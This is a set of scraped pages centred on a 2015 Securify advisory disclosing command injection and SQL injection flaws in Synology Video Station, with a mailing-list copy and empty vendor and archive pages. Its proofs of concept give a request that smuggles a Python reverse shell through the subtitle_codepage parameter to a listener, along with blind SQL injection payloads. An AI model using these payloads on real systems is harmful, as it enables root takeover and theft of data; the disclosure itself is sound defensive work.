=== Content from www.securify.nl_5103ae36_20250125_093651.html ===
[Securify home](/)Menu![contact](https://www.datocms-assets.com/21957/1585735393-phone-call.svg)Bel ons![contact](https://www.datocms-assets.com/21957/1585735542-letter.svg)Mail ons

* [Code](/diensten/agile-security/)
* [Pentesten](/diensten/pentesting/)
* [Organisatie](/diensten/red-teaming/)
* [Publicaties](/artikelen/)
* [Over ons](/over-ons/)
nl

* [en](/en/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/)
* [nl](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/)
#### Advisory

![](data:image/svg+xml;charset=utf-8...)![](data:image/jpg;base64...)![Cengiz Han Sahin]()![Cengiz Han Sahin](https://www.datocms-assets.com/21957/1596789475-img2779.jpg?auto=format&dpr=0.04&w=2419)**Cengiz Han Sahin**August 10, 2015
# Synology Video Station command injection and multiple SQL injection vulnerabilities

#### Spring naar

* [Abstract](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#abstract)
* [Affected versions](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#affected-versions)
* [Fix](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#fix)
* [Introduction](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#introduction)
* [Command injection vulnerability in subtitle.cgi](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#command-injection-vulnerability-in-subtitlecgi)

  + [Proof of concept](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#proof-of-concept)
* [SQL injection vulnerability in watchstatus.cgi](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#sql-injection-vulnerability-in-watchstatuscgi)

  + [Proof of concept](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#proof-of-concept-1)
* [SQL injection vulnerability in audiotrack.cgi](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#sql-injection-vulnerability-in-audiotrackcgi)

  + [Proof of concept](/advisory/synology-video-station-command-injection-and-multiple-sql-injection-vulnerabilities/#proof-of-concept-2)
## Abstract

It was discovered that Synology Video Station is vulnerable to command injection that allows an attacker to execute arbitrary system commands with `root` privileges. In addition, Video Station is affected by multiple SQL injection vulnerabilities that allows for execution of arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server.

## Affected versions

These issues affect Synology Video Station version up to and including version 1.5-0757.

## Fix

Synology has reported that these issue have been resolved in:

* Video Station version 1.5-0757 [audiotrack.cgi]
* Video Station version 1.5-0763 [watchstatus.cgi]
* Video Station version 1.5-0763 [subtitle.cgi]

## Introduction

![](https://www.datocms-assets.com/21957/1592562389-synovideostation.png)

Video Station is a video organizer with more than 7.610.000+ installations. And is used for playing of video files on computer and mobile phone. Video Station also lets users share videos with friends and family easily by eliminating account and password setup.

It was discovered that Synology Video Station is vulnerable to command injection that allows an attacker to execute arbitrary system commands with `root` privileges. In addition, Video Station is affected by multiple SQL injection vulnerabilities that allows for execution of arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server.

## Command injection vulnerability in subtitle.cgi

A command injection vulnerability exists in the `subtitle.cgi` CGI script. This issue exists in the `subtitle_codepage` parameter, which allows an attacker to execute arbitrary commands with `root` privileges. The script `subtitle.cgi` can also be called when the 'public share' option is enabled. With this option enabled, this issue can also be exploited by an unauthenticated remote attacker. This vulnerability can be used to compromise a Synology DiskStation NAS, including all data stored on the NAS, and the NAS as stepping stone to attack other systems.

### Proof of concept

* Start netcat on attacker's system:

`nc -nvlp 80`

* Submit the following request (change the IP - 192.168.1.20 - & port number - 80):

```
GET /webapi/VideoStation/subtitle.cgi?id=193&api=SYNO.VideoStation.Subtitle&method=get&version=2&subtitle_id=%2Fvolume1%2Fvideo%2Fmr.robot.s01e10.720p.hdtv.x264-killers.nfo%2FMr.Robot.S01E10.720p.HDTV.x264-KILLERS.2aafa5c.eng.srt&subtitle_codepage=auto**%26python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.20%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5b%22/bin/sh%22,%22-i%22%5d);'%26**&preview=false&sharing_id=kSiNy0Pp HTTP/1.1
Host: 192.168.1.13:5000
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

```
## SQL injection vulnerability in watchstatus.cgi

A (blind) SQL injection vulnerability exists in the `watchstatus.cgi` CGI script. This issue exists in the code handling the 'id' parameter and allows an attacker to execute arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server. In the following screenshot this issue is exploited using [sqlmap](http://sqlmap.org/).

![](https://www.datocms-assets.com/21957/1592562389-sqlmap.png)

### Proof of concept

```
POST /webapi/VideoStation/watchstatus.cgi HTTP/1.1
Host: 192.168.1.13:5000
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
*X-SYNO-TOKEN: Lq6mE9ANV2egU*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 80
Cookie: stay_login=0; id=Lq5QWGqg7Rnzc13A0LTN001710; jwplayer.volume=50
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

id=**15076178770%20or%204864%3d4864--%20**&position=10.05&api=SYNO.VideoStation.WatchStatus&method=setinfo&version=1

```

It should be noted that the `X-SYNO-TOKEN` header provides protection against Cross-Site Request Forgery attacks. As of DSM version 5.2-5592 Update 3, this protection is enabled by default.

## SQL injection vulnerability in audiotrack.cgi

A (blind) SQL injection vulnerability exists in the `audiotrack.cgi` CGI script. This issue exists in the code handling the `id` parameter and allows an attacker to execute arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server.

### Proof of concept

```
POST /webapi/VideoStation/audiotrack.cgi HTTP/1.1
Content-Length: 294
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-SYNO-TOKEN: 7IKJdJMa8cutE
Host: <hostname>:5000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: stay_login=0; id=7IivlxDM9MFb213A0LTN001710

id=**1%20AND%20%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20usesuper%3Dtrue%20FROM%20pg_user%20WHERE%20usename%3DCURRENT_USER%20OFFSET%200%20LIMIT%201%29%29%20THEN%20%28CHR%2849%29%29%20ELSE%20%28CHR%2848%29%29%20END%29%29%3D%28CHR%2849%29%29**&api=SYNO.VideoStation.AudioTrack&method=list&version=1

```
## Vragen of feedback?

Bel ons![contact](https://www.datocms-assets.com/21957/1585735393-phone-call.svg)Mail ons![contact](https://www.datocms-assets.com/21957/1585735542-letter.svg)[![Securify logo](https://www.datocms-assets.com/21957/1589468815-imglogofullwhite.svg)Securify home](/)

**Kantoor:**

Naritaweg 132

1043 CA Amsterdam

**Telefoon:** +31 20 82 04 516

**Mail:** info@securify.nl

**KvK nummer:** 58043624

**Responsible Disclosure:**

rd@securify.nl

**GPG:** 2CC6 9E7A 7CEC E259 2FCC BF92 EC11 E0AC 0101 CC82

* [Events](/evenementen/)
* [LinkedIn](https://www.linkedin.com/company/securify-group)
* [Twitter](https://twitter.com/securifybv)
* [Jobs](https://securifybv.recruitee.com/)
* [Privacy Policy](/privacy-policy/)
* [Terms](/voorwaarden/)
© 2024 Securify BV



=== Content from seclists.org_d54e7480_20250125_093649.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

![](/shared/images/nst-icons.svg#search)

# Synology Video Station command injection and multiple SQL injection vulnerabilities

---

*From*: "Securify B.V." <lists () securify nl>

*Date*: Wed, 9 Sep 2015 20:15:35 +0200

---

```

------------------------------------------------------------------------
Synology Video Station command injection and multiple SQL injection
vulnerabilities
------------------------------------------------------------------------
Han Sahin, September 2015

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
It was discovered that Synology Video Station is vulnerable to command
injection that allows an attacker to execute arbitrary system commands
with root privileges. In addition, Video Station is affected by multiple
SQL injection vulnerabilities that allows for execution of arbitrary SQL
statements with DBA privileges. As a result it is possible to compromise
the PostgreSQL database server.

------------------------------------------------------------------------
Affected versions
------------------------------------------------------------------------
These issues affect Synology Video Station version up to and including
version 1.5-0757.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Synology has reported that these issue have been resolved in:

- Video Station version 1.5-0757 [audiotrack.cgi]
- Video Station version 1.5-0763 [watchstatus.cgi]
- Video Station version 1.5-0763 [subtitle.cgi]

------------------------------------------------------------------------
Details
------------------------------------------------------------------------

```
<https://www.securify.nl/advisory/SFY20150810/synology_video_station_command_injection_and_multiple_sql_injection_vulnerabilities.html>
```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

### Current thread:

* **Synology Video Station command injection and multiple SQL injection vulnerabilities** *Securify B.V. (Sep 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_3fd96f77_20250125_093648.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.synology.com_cd5ae0ef_20250125_093653.html ===


#

OS

Version

Version

### Version:

 Important Update

Release Candidate

---

Notes:

* This version is released in a [staged rollout](https://kb.synology.com/en-global/DSM/tutorial/DSM_update_why_latest_version_available_online_but_not_in_control_panel).

## What can we do for you?

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector_home.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector in homepage")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator_home.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator in homepage")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector_home.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector in homepage")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base_home.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center in homepage")

[![Downloads icon](img/footer/2019/footer_icon_downloads_home.png)

Downloads](support/download "Navigate to Downloads in homepage")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter_home.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter in homepage")

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center")

[![Downloads icon](img/footer/2019/footer_icon_downloads.png)

Downloads](support/download "Navigate to Downloads")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter")

Company

* [About Synology](company)
* [Blog](https://blog.synology.com/)
* [Newsroom](company/news)
* [Media Coverage](company/reviews)
* [Customer Stories](company/case_study)
* [Office Locations](company/office_location)
* [ESG](company/esg)

Sales

* [Where to Buy](wheretobuy)
* [Contact Us](company/contact_us)
* [Become a Partner](/form/inquiry/sales)

Compatibility

* [HDD/SSD](compatibility?search_by=drives)
* [IP Cameras](compatibility/camera)
* [Network Cards](compatibility?search_by=category&category=network_interface_cards&p=1)
* [I/O Modules, IP Speakers, Access Controllers](compatibility/surveillance_devices)
* [Other Devices](compatibility?search_by=category)

Resources

* [Products A-Z](products-a-z)
* [Beta Program](beta)
* [Bounty Program](security/bounty_program)
* [Community](https://community.synology.com/enu)
* [Events](https://event.synology.com/en-global)
* [Subscribe to Newsletter](/subscribe-newsletter)

Copyright © 2025 Synology Inc. All rights reserved.
[Terms & Conditions](company/legal/terms_conditions "Terms & Conditions")
| [Privacy](company/legal/privacy "Privacy")
| Cookie Preference

 Global - English

Continue


